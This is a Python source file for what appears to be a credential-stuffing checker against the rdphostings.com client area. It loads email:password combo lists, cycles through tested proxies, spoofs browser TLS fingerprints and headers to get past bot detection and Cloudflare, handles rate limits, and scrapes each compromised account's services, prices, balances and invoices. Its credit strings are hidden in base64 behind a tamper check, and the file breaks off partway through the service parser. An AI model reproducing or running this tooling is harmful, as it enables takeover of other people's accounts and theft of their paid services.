import os
import re
import sys
import json
import time
import base64
import random
import string
import secrets
import hashlib
import shutil
import threading
import subprocess
import configparser
import urllib3
import urllib.parse
import uuid
from pathlib import Path
from datetime import datetime
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

from curl_cffi import requests as cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v69"
EYELIFTER_YEAR = "2026"

_F1T = "UkRQ"
_F2T = "SG9zdGluZ3M="
_F3T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "UkRQSG9zdGluZ3Nf"
_F2D = "QGV5ZWxpZnRlcg=="
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.rdp.seal")
_SEALED = None


def eyelifter_d(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)

EYELIFTER_TOOL = eyelifter_j(_F1T, _F2T, _F3T)
EYELIFTER_TG_USER = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS = eyelifter_j(_F1D, _F2D)
EYELIFTER_TAG = eyelifter_j(_F1G, _F2G)
EYELIFTER_SEAL_STR = eyelifter_j(_F1S, _F2S)

TOOL = EYELIFTER_TOOL
TG_USER = EYELIFTER_TG_USER
TG_CHAN = EYELIFTER_TG_CHAN
RESULTS = EYELIFTER_RESULTS
TAG = EYELIFTER_TAG
SEAL = EYELIFTER_SEAL_STR
CREDIT = EYELIFTER

LINE_TAG = f"by {TG_USER} | {TG_CHAN}"

EXPECTED_TOOL = "RDPHostings Checker"


def eyelifter_verify(ctx="x"):
    global _SEALED
    if _SEALED is True:
        return True
    if TOOL != EXPECTED_TOOL:
        raise RuntimeError("eyelifter: credit stripped.")
    if TG_USER != "@samvir1" or TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _SEALED = True
    return True


verify = eyelifter_verify

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


def eyelifter_vlen(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def eyelifter_center(t, w):
    vl = eyelifter_vlen(t)
    if vl >= w:
        return t
    l = (w - vl) // 2
    return " " * l + t + " " * (w - vl - l)


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_rline(i, t, st, txt, c, bold=False):
    with _CL:
        pre = f"[{i}/{t}]"
        if _ANSI:
            print(f"{eyelifter_color('90', pre)} {eyelifter_color(c, st.ljust(6), bold)} {txt}", flush=True)
        else:
            print(f"{pre} {st.ljust(6)} {txt}", flush=True)


def eyelifter_human_time(iso):
    if not iso:
        return ""
    try:
        dt = datetime.fromisoformat(str(iso).replace("Z", "").replace("+00:00", ""))
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(iso)[:19].replace("T", " ")


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", eyelifter_center(title, width), True))
    if sub:
        print(eyelifter_color("2", eyelifter_center(sub, width)))
    print(eyelifter_color("5", eyelifter_center(f"eyelifter · {TG_USER} · {TG_CHAN}", width)))
    print(eyelifter_color("90", line * width))


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    vl = eyelifter_vlen(lbl)
    side = max(1, (width - vl) // 2)
    print(eyelifter_color("90", "─" * side) + eyelifter_color("96", lbl, True)
          + eyelifter_color("90", "─" * (width - vl - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96", f"═══ eyelifter · {TG_USER} · {TG_CHAN} ═══", True))
    if not rows:
        return
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  {eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


color = eyelifter_color
vlen = eyelifter_vlen
center = eyelifter_center
log = eyelifter_log
rline = eyelifter_rline
human_time = eyelifter_human_time
banner = eyelifter_banner
section = eyelifter_section
divider = eyelifter_divider
summary = eyelifter_summary

CFG_PATH = os.path.join(
    os.environ.get("RDP_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_rdp.ini"
)

MAX_THREADS = 200


class EyelifterConfig:
    def __init__(self, cf=CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self._load()

    def _load(self):
        if not os.path.exists(self.config_file):
            self._default()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self._parse()
        except Exception:
            self._default()
            self._parse()

    def _default(self):
        self.config["eyelifter"] = {
            "threads": "8",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "1",
            "retry_delay": "1.5",
            "combo_delay": "0.4",
            "open_channel_on_launch": "true",
            "rate_limit_delay": "12",
            "skip_proxy_test": "false",
            "fp_rotate": "session",
            "fp_pool": "",
            "fp_jitter": "true",
            "debug": "false",
            "min_price_for_hit": "0.01",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def _parse(self):
        if "eyelifter" not in self.config:
            self.config["eyelifter"] = {}
        c = self.config["eyelifter"]
        self.settings["threads"] = max(1, min(MAX_THREADS, c.getint("threads", 8)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(6, c.getint("retries", 1)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["rate_limit_delay"] = max(1, min(120, c.getint("rate_limit_delay", 12)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["fp_rotate"] = c.get("fp_rotate", "session").strip().lower()
        if self.settings["fp_rotate"] not in ("session", "attempt", "fixed"):
            self.settings["fp_rotate"] = "session"
        self.settings["fp_pool"] = c.get("fp_pool", "")
        self.settings["fp_jitter"] = c.getboolean("fp_jitter", True)
        self.settings["debug"] = c.getboolean("debug", False)
        try:
            self.settings["min_price_for_hit"] = max(0.0, c.getfloat("min_price_for_hit", 0.01))
        except Exception:
            self.settings["min_price_for_hit"] = 0.01

    def save(self):
        if "eyelifter" not in self.config:
            self.config["eyelifter"] = {}
        for k, v in self.settings.items():
            self.config["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


Loader = EyelifterConfig
_loader = EyelifterConfig()

_FP_LOCK = threading.Lock()
_FP_CURRENT = None
_FP_USED = []
_FP_HITS = 0
_FP_WARM = {}


def _fp_targets():
    raw = (_loader.settings.get("fp_pool") or "").strip()
    names = [n.strip() for n in raw.split(",") if n.strip()] if raw else []
    if not names:
        names = ["chrome", "chrome146", "chrome145", "chrome142", "chrome136",
                 "chrome133a", "chrome131", "chrome124", "chrome123", "chrome120",
                 "edge101", "firefox147", "firefox144", "safari2601", "safari260",
                 "chrome131_android", "chrome99_android", "tor145"]
    return names


def _fp_kind(imp):
    n = str(imp).lower()
    if n.startswith("edge"):
        return "edge"
    if "safari" in n:
        return "ios" if n.endswith("_ios") else "safari"
    if n.startswith("firefox") or n.startswith("tor"):
        return "firefox"
    if "android" in n or n.endswith("_ios"):
        return "android"
    return "chrome"


def _fp_major(imp, kind):
    m = re.search(r"(\d+)", str(imp))
    if m:
        return int(m.group(1))
    return {"chrome": 146, "edge": 101, "safari": 26, "ios": 26,
            "firefox": 147, "android": 131}[kind]


def _win_token():
    return ("Windows NT 10.0; Win64; x64", '"Windows"', "15.0.0")


def _mac_token():
    return ("Macintosh; Intel Mac OS X 10_15_7", '"macOS"', "15.7.0")


def _linux_token():
    return ("X11; Linux x86_64", '"Linux"', "6.6.0")


def _os_tokens():
    return [_win_token(), _mac_token(), _linux_token()]


_ANDROID_VERS = ["11", "12", "13", "14", "15"]
_ANDROID_MODELS = ["Pixel 7", "Pixel 8", "Pixel 8 Pro", "SM-S918B", "SM-G991B",
                  "Pixel 6a", "Redmi Note 12", "moto g84 5G", "CPH2451"]


def _android_token():
    v = random.choice(_ANDROID_VERS)
    mdl = random.choice(_ANDROID_MODELS)
    return (f"Linux; Android {v}; {mdl}", '"Android"', f'"{v}.0.0"')


def _gen_ua(imp, kind):
    major = _fp_major(imp, kind)
    if kind == "firefox":
        os_tok, plat, pver = _os_tokens()[0] if random.random() < 0.7 else _linux_token()
        ua = (f"Mozilla/5.0 ({os_tok}; rv:{major}.0) Gecko/20100101 "
              f"Firefox/{major}.0")
        return ua, plat, "?0", pver, None
    if kind in ("safari", "ios"):
        if kind == "ios":
            os_tok = f"iPhone; CPU iPhone OS {major}_{major % 10 or 3} like Mac OS X"
            ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/605.1.15 "
                  f"(KHTML, like Gecko) Version/{major}.{random.randint(0, 6)} "
                  f"Mobile/15E148 Safari/604.1")
        else:
            os_tok = "Macintosh; Intel Mac OS X 10_15_7"
            ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/605.1.15 "
                  f"(KHTML, like Gecko) Version/{major}.{random.randint(0, 6)} "
                  f"Safari/605.1.15")
        return ua, '"macOS"', "?0", '"15.7.0"', None
    if kind == "android":
        os_tok, plat, pver = _android_token()
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 "
              f"Mobile Safari/537.36")
    elif kind == "edge":
        os_tok, plat, pver = _win_token()
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 "
              f"Safari/537.36 Edg/{major}.0.0.0")
    else:
        os_tok, plat, pver = random.choice(_os_tokens())
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 Safari/537.36")
    return ua, plat, "?1" if kind == "android" else "?0", pver, str(major)


def _sec_brand(kind, major):
    brand = {"chrome": "Google Chrome", "edge": "Microsoft Edge",
             "android": "Google Chrome", "safari": "Chromium",
             "firefox": "Firefox"}[kind]
    if kind == "firefox":
        return None
    m = str(major)
    if kind == "edge":
        return (f'"Microsoft Edge";v="{m}", "Chromium";v="{m}", '
                f'"Not(A:Brand";v="24"')
    return (f'"{brand}";v="{m}", "Chromium";v="{m}", "Not(A:Brand";v="24"')


def _gen_lang():
    return random.choice([
        "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
    ])


_FP_ALIASES = {"chrome", "edge", "safari", "safari_ios",
               "safari_beta", "safari_ios_beta", "firefox", "tor",
               "chrome_android"}


def _known_targets():
    try:
        from curl_cffi.requests.impersonate import BrowserType
        names = {str(getattr(v, "value", v)) for v in BrowserType}
    except Exception:
        names = set()
    return names | _FP_ALIASES


def _warm_ok(imp):
    if imp in _FP_WARM:
        return _FP_WARM[imp]
    ok = imp in _known_targets()
    if ok:
        try:
            s = cffi.Session(impersonate=imp, timeout=6)
            s.verify = False
            s.close()
        except Exception:
            ok = False
    _FP_WARM[imp] = ok
    return ok


def _jitter_fp(kind):
    if not _loader.settings.get("fp_jitter", False):
        return None
    fp = {}
    if kind in ("chrome", "edge", "android"):
        fp["tls_grease"] = random.choice([True, False])
        fp["tls_permute_extensions"] = random.choice([True, False])
    fp["http2_no_priority"] = random.choice([True, False])
    return fp


def pick_fp(force_new=False, peek=False):
    global _FP_CURRENT, _FP_USED, _FP_HITS
    mode = (_loader.settings.get("fp_rotate") or "session").strip().lower()
    with _FP_LOCK:
        if _FP_CURRENT is not None and not force_new and not peek:
            if mode == "fixed":
                return _FP_CURRENT
            if mode == "attempt" and _FP_HITS <= 1:
                _FP_HITS += 1
                return _FP_CURRENT
        pool = [t for t in _fp_targets() if _warm_ok(t)]
        if not pool:
            pool = ["chrome"]
        if len(pool) > 1 and _FP_USED:
            pool = [t for t in pool if t != _FP_USED[-1]] or pool
        imp = random.choice(pool)
        kind = _fp_kind(imp)
        ua, plat, mob, pver, major = _gen_ua(imp, kind)
        brand = _sec_brand(kind, major) if major else None
        headers = {
            "user-agent": ua,
            "accept-language": _gen_lang(),
        }
        if brand:
            headers["sec-ch-ua"] = brand
            headers["sec-ch-ua-mobile"] = mob
            headers["sec-ch-ua-platform"] = plat
            headers["sec-ch-ua-platform-version"] = pver
        extra = _jitter_fp(kind)
        fp = {"imp": imp, "kind": kind, "headers": headers, "extra_fp": extra}
        if not peek:
            _FP_CURRENT = fp
            _FP_USED.append(imp)
            if len(_FP_USED) > 40:
                _FP_USED.pop(0)
            _FP_HITS = 1
        return fp


def rotate_fp():
    with _FP_LOCK:
        _FP_CURRENT = None
        _FP_HITS = 0


def reset_fp_cycle():
    global _FP_CURRENT, _FP_USED, _FP_HITS
    with _FP_LOCK:
        _FP_CURRENT = None
        _FP_USED = []
        _FP_HITS = 0


BASE = "https://rdphostings.com"
LOGIN_URL = f"{BASE}/rdp/login"
SERVICES_URL = f"{BASE}/rdp/clientarea.php?action=services"
INVOICES_URL = f"{BASE}/rdp/clientarea.php?action=invoices"
ADD_FUNDS_URL = f"{BASE}/rdp/clientarea.php?action=addfunds"
CLIENT_AREA_URL = f"{BASE}/rdp/clientarea.php"
DETAILS_URL = f"{BASE}/rdp/clientarea.php?action=details"

_COMBORX = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.I,
)

_TOKEN_RES = [
    re.compile(r'name=["\']token["\']\s+value=["\']([^"\']+)["\']', re.I),
    re.compile(r'value=["\']([^"\']+)["\']\s+name=["\']token["\']', re.I),
]
_WELCOME_RE = re.compile(r"Welcome\s+back[,\s]+([A-Za-z][A-Za-z0-9 _.\-]{0,40})", re.I)
_FAIL_RE = re.compile(
    r"("
    r"Login Details Incorrect"
    r"|Incorrect (?:username|password|login)"
    r"|Invalid (?:username|password|login|credentials)"
    r"|login failed"
    r")",
    re.I,
)
_CF_MARKERS = (
    "just a moment",
    "checking your browser",
    "__cf_chl",
    "cf-chl",
    "challenge-platform",
    "attention required",
)

_SERVICE_TR_RE = re.compile(
    r'<tr[^>]*onclick="[^"]*productdetails[^"]*"[^>]*>(.*?)</tr>',
    re.I | re.S,
)
_SERVICE_ID_RE = re.compile(r'data-element-id="(\d+)"', re.I)
_SERVICE_TOOLTIP_RE = re.compile(r'title="([^"]*)"', re.I)
_SERVICE_NAME_RE = re.compile(r'<strong>([^<]+)</strong>', re.I)
_SERVICE_ORDER_RE = re.compile(r'data-order="([\d.]+)"', re.I)
_SERVICE_PRICE_RE = re.compile(
    r'data-order="([\d.,]+)\s+[A-Z]{3}"[^>]*>\s*[^\d]*?([\d.,]+)\s*([A-Z]{3})?',
    re.I,
)
_SERVICE_PRICE_FALLBACK_RE = re.compile(
    r'data-order="([\d.,]+)"[^>]*>\s*\$?\s*([\d.,]+)\s*([A-Z]{3})?',
    re.I,
)
_SERVICE_STATUS_RE = re.compile(r'class="[^"]*\bstatus-([a-z]+)\b[^"]*"', re.I)
_SERVICE_STATUS_LABEL_RE = re.compile(
    r'class="[^"]*\bstatus-[a-z]+\b[^"]*"[^>]*>\s*([^<]+?)\s*<',
    re.I,
)
_SERVICE_DUE_RE = re.compile(
    r'<span[^>]*class="[^"]*w-hidden[^"]*"[^>]*>([^<]+)</span>\s*([^<]*)',
    re.I,
)
_SERVICE_CYCLE_RE = re.compile(
    r'>\s*(Monthly|Annually|Annual|Quarterly|Semi-Annually|Biennially|'
    r'Triennially|One Time|Hourly|Daily|Weekly)\s*<',
    re.I,
)

_INVOICE_TR_RE = re.compile(r'<tr[^>]*>(.*?)</tr>', re.I | re.S)
_INVOICE_LINK_RE = re.compile(r'viewinvoice[^>]*>\s*#?([^<]+)</a>', re.I)
_INVOICE_AMOUNT_RE = re.compile(r'\$?\s*([\d,]+\.\d{2})\s*([A-Z]{3})?')
_INVOICE_STATUS_RE = re.compile(r'class="[^"]*\bstatus-([a-z]+)\b[^"]*"', re.I)

_BAL_RE = re.compile(
    r'(?:Balance|Credit|Funds)[^$<]{0,40}\$?\s*([\d,]+\.\d{2})',
    re.I,
)

_COUNTRY_SELECTED_RE = re.compile(
    r'<option[^>]*value=["\']([A-Za-z]{2})["\'][^>]*selected',
    re.I,
)

_IMP_VALIDATED = False
_DBG_LOCK = threading.Lock()


class _FormParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.inputs = []
        self.selects = {}
        self._sel = None
        self._opt = None

    def handle_starttag(self, tag, attrs):
        a = {k: (v if v is not None else "") for k, v in attrs}
        t = tag.lower()
        if t == "input":
            name = a.get("name", "")
            if not name:
                return
            self.inputs.append({
                "name": name,
                "type": (a.get("type") or "text").lower(),
                "value": a.get("value", ""),
                "id": a.get("id", ""),
                "checked": "checked" in a,
            })
        elif t == "select":
            name = a.get("name", "")
            if name:
                self._sel = {"name": name, "options": [], "selected": None}
        elif t == "option" and self._sel is not None:
            self._opt = {
                "value": a.get("value", ""),
                "selected": "selected" in a,
                "text": "",
            }
            self._sel["options"].append(self._opt)

    def handle_data(self, data):
        if self._opt is not None:
            self._opt["text"] += data

    def handle_endtag(self, tag):
        t = tag.lower()
        if t == "option":
            self._opt = None
        elif t == "select" and self._sel is not None:
            for o in self._sel["options"]:
                if o["selected"]:
                    self._sel["selected"] = o["value"]
                    break
            self.selects[self._sel["name"]] = self._sel
            self._sel = None


def _parse_form(html):
    p = _FormParser()
    try:
        p.feed(html)
    except Exception:
        pass
    return p


def _input_val(inputs, name):
    for i in inputs:
        if i["name"] == name:
            return i["value"]
    return None


def eyelifter_dbg_dir():
    global _FOLDER
    with _DBG_LOCK:
        if _FOLDER:
            d = os.path.join(_FOLDER, "Debug")
        else:
            root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
            os.makedirs(root, exist_ok=True)
            d = os.path.join(root, "Debug_adhoc")
        os.makedirs(d, exist_ok=True)
        return d


def eyelifter_debug_dump(ctx, r, ident="", extra=""):
    if not _loader.settings.get("debug", False):
        return
    try:
        code = getattr(r, "status_code", "?")
        url = getattr(r, "url", "?")
        text = getattr(r, "text", "") or ""
        tm = re.search(r"<title>(.*?)</title>", text, re.DOTALL)
        title = tm.group(1).strip()[:80] if tm else ""
        snippet = re.sub(r"\s+", " ", text[:260])
        eyelifter_log("🐛", "DEBUG", "RESP",
            f"{TG_USER} | [{ctx}] {code} {str(url)[:70]} title={title!r} {extra}")
        if snippet:
            eyelifter_log("🐛", "DEBUG", "BODY", f"{snippet[:240]}")
        d = eyelifter_dbg_dir()
        fn = re.sub(r"[^A-Za-z0-9._-]", "_", f"{ctx}_{ident or 'x'}_{int(time.time()*1000)}")
        safe = text
        try:
            safe = re.sub(r'(?i)(set-cookie:[^\n]+)', 'set-cookie: [redacted]', safe)
            safe = re.sub(r'(?i)(authorization:[^\n]+)', 'authorization: [redacted]', safe)
            safe = re.sub(r'(?i)(name="token"[^>]*value=")([^"]+)(")',
                          r'\1[redacted]\3', safe)
        except Exception:
            pass
        with open(os.path.join(d, f"{fn}.html"), "w", encoding="utf-8") as f:
            f.write(f"<!-- eyelifter · {TG_USER} · {TG_CHAN} -->\n")
            f.write(f"<!-- ctx: {ctx} -->\n")
            f.write(f"<!-- identifier: {ident} -->\n")
            f.write(f"<!-- url: {url} -->\n")
            f.write(f"<!-- status: {code} -->\n\n")
            f.write(safe)
    except Exception as e:
        eyelifter_log("🐛", "DEBUG", "RESP", f"dump failed: {e}")


_PHOST = re.compile(r"^(?:\d{1,3}(?:\.\d{1,3}){3}|[a-zA-Z0-9][a-zA-Z0-9\-\.]*\.[a-zA-Z]{2,})$")


def eyelifter_host(s):
    if not s:
        return False
    if s.startswith("[") and s.endswith("]"):
        return True
    return bool(_PHOST.match(s))


def eyelifter_port(s):
    return bool(s) and s.isdigit() and 1 <= int(s) <= 65535


def eyelifter_fmt_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None
    scheme = None
    rest = p
    if "://" in p:
        scheme, _, rest = p.partition("://")
        scheme = scheme.strip().lower()
        if scheme not in ("http", "https", "socks4", "socks5"):
            return None
        rest = rest.strip()
    s = scheme or "http"
    if not rest:
        return None
    if "@" in rest:
        creds, _, hostport = rest.rpartition("@")
        if ":" in creds and ":" in hostport:
            user, _, pwd = creds.partition(":")
            host, _, port = hostport.partition(":")
            if user and pwd and host and eyelifter_port(port):
                return f"{s}://{user}:{pwd}@{host}:{port}"
    parts = rest.split(":")
    if len(parts) == 2:
        host, port = parts
        if eyelifter_host(host) and eyelifter_port(port):
            return f"{s}://{host}:{port}"
        return None
    if len(parts) == 4:
        a, b, c, d = parts
        if eyelifter_host(a) and eyelifter_port(b):
            return f"{s}://{c}:{d}@{a}:{b}"
        if eyelifter_host(c) and eyelifter_port(d):
            return f"{s}://{a}:{b}@{c}:{d}"
        return f"{s}://{a}:{b}@{c}:{d}"
    return None


def eyelifter_test_proxy(p):
    try:
        fp = pick_fp(peek=True)
        kw = {"impersonate": fp["imp"], "timeout": 6}
        if fp.get("extra_fp"):
            kw["extra_fp"] = fp["extra_fp"]
        r = cffi.get("https://api.ipify.org?format=json",
                     proxies={"http": p, "https": p},
                     headers=fp["headers"], **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_load_proxies():
    path = _loader.settings.get("proxies_file", "proxies.txt")
    if path and not os.path.isabs(path):
        path = os.path.join(os.path.dirname(CFG_PATH), path)
    if not path or not os.path.isfile(path):
        return []
    raw = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = eyelifter_fmt_proxy(line)
            if p:
                raw.append(p)
    raw = list(dict.fromkeys(raw))
    if not raw:
        return []
    if _loader.settings.get("skip_proxy_test", False):
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(raw)} loaded (test skipped) [eyelifter]")
        return raw
    total = len(raw)
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total} proxies... [eyelifter]")
    good = []
    done = 0
    lock = threading.Lock()

    def probe(p):
        nonlocal done
        ok = eyelifter_test_proxy(p)
        with lock:
            done += 1
            if ok:
                good.append(p)
            if done % 20 == 0 or done == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {done}/{total} — {len(good)} live [eyelifter]")

    with ThreadPoolExecutor(max_workers=min(80, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in raw]):
            try:
                f.result()
            except Exception:
                pass

    eyelifter_log("✅", "INFO", "PROXY", f"{len(good)}/{total} live [eyelifter]")
    return good


_LK = threading.Lock()
_PK = threading.Lock()
_FK = threading.Lock()
_IK = threading.Lock()
_RL = threading.Lock()
_STOP = threading.Event()

_ST = {"checked": 0, "hit": 0, "free": 0, "none": 0, "bad": 0,
       "errors": 0, "rl": 0, "temp": 0, "pfails": 0}
_START = time.time()
_TOTAL = 0
_POOL = []
_BADP = set()
_COOLP = {}
_INUSE = set()
_RLU = 0.0
_SVCSETS = {}
_CTRY_SETS = {}
_HIT_F = _FREE_F = _NONE_F = _BAD_F = _ERR_F = None
_FOLDER = None


def eyelifter_reset_stats():
    global _ST, _START, _SVCSETS, _COOLP, _CTRY_SETS, _BADP, _RLU
    with _LK:
        _ST = {"checked": 0, "hit": 0, "free": 0, "none": 0, "bad": 0,
               "errors": 0, "rl": 0, "temp": 0, "pfails": 0}
        _START = time.time()
        _SVCSETS = {}
        _CTRY_SETS = {}
    with _PK:
        _COOLP = {}
        _BADP = set()
    with _RL:
        _RLU = 0.0
    reset_fp_cycle()


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _PK:
        avail = [p for p in _POOL
                 if p not in _BADP and _COOLP.get(p, 0.0) <= now]
    with _IK:
        free = [p for p in avail if p not in _INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _IK:
            _INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _IK:
        _INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _PK:
        if p in _BADP:
            return
        _BADP.add(p)
    with _LK:
        _ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _PK:
        _COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _RLU
    with _RL:
        _RLU = max(_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _STOP.is_set():
        with _RL:
            gap = _RLU - time.time()
        if gap <= 0:
            return
        if _STOP.wait(min(gap, 1.0)):
            return


def eyelifter_build(proxy=None, force_new=False):
    global _IMP_VALIDATED
    to = _loader.settings.get("timeout", 25)
    fp = pick_fp(force_new=force_new)
    imp = fp["imp"]

    s = None
    try:
        kw = {"impersonate": imp, "timeout": to}
        if fp.get("extra_fp"):
            kw["extra_fp"] = fp["extra_fp"]
        s = cffi.Session(**kw)
        _IMP_VALIDATED = True
    except Exception:
        if not _IMP_VALIDATED:
            eyelifter_log("⚠️", "WARN", "IMPERSONATE",
                f"'{imp}' not supported, falling back to 'chrome' [eyelifter]")
        try:
            s = cffi.Session(impersonate="chrome", timeout=to)
        except Exception:
            s = cffi.Session(timeout=to)
        _IMP_VALIDATED = True

    s.verify = False
    s.headers.update(fp["headers"])
    s.headers.update({
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "upgrade-insecure-requests": "1",
        "cache-control": "no-cache",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_extract_token(html):
    for rx in _TOKEN_RES:
        m = rx.search(html)
        if m:
            return m.group(1)
    return None


def _due_to_dt(raw):
    if not raw:
        return None
    s = str(raw).strip()
    if not s or s == "-":
        return None
    s = re.sub(r"(\d+)(st|nd|rd|th)\b", r"\1", s)
    s = s.replace(",", "")
    for fmt in ("%Y-%m-%d", "%Y-%m-%d %H:%M:%S", "%d/%m/%Y", "%d-%m-%Y",
                "%d/%m/%Y %H:%M", "%b %d %Y", "%d %b %Y", "%B %d %Y",
                "%d %B %Y", "%A %B %d %Y", "%A %d %B %Y"):
        try:
            return datetime.strptime(s, fmt)
        except ValueError:
            continue
    try:
        return datetime.fromisoformat(s.replace("Z", "").split("+")[0])
    except Exception:
        pass
    m = re.match(r'^(\d{2})[/-](\d{2})[/-](\d{4})', s)
    if m:
        try:
            return datetime(int(m.group(3)), int(m.group(2)), int(m.group(1)))
        except ValueError:
            pass
    return None


def _days_left(dt):
    if not dt:
        return None
    try:
        delta = dt - datetime.now()
        return delta.days
    except Exception:
        return None


def _days_left_str(days):
    if days is None:
        return "-"
    if days < 0:
        return f"OVERDUE {abs(days)}d"
    if days == 0:
        return "TODAY"
    if days == 1:
        return "1d left"
    return f"{days}d left"


def _is_free_cycle(cycle):
    if not cycle:
        return False
    return cycle.strip().lower() in ("free", "free account")

def eyelifter_parse_services(html):
    out = []
    for m in _SERVICE_TR_RE.finditer(html):
        row = m.group(1)
        sid = _SERVICE_ID_RE.search(row)
        tip = _SERVICE_TOOLTIP_RE.search(row)
        nm = _SERVICE_NAME_RE.search(row)
        order = _SERVICE_ORDER_RE.search(row)
        price = _SERVICE_PRICE_RE.search(row)
        if not price:
            price = _SERVICE_PRICE_FALLBACK_RE.search(row)
        st = _SERVICE_STATUS_RE.search(row)
        label = _SERVICE_STATUS_LABEL_RE.search(row)
        due = _SERVICE_DUE_RE.search(row)
        cyc = _SERVICE_CYCLE_RE.search(row)

        amount = 0.0
        currency = "USD"
        if price:
            try:
                groups = price.groups()
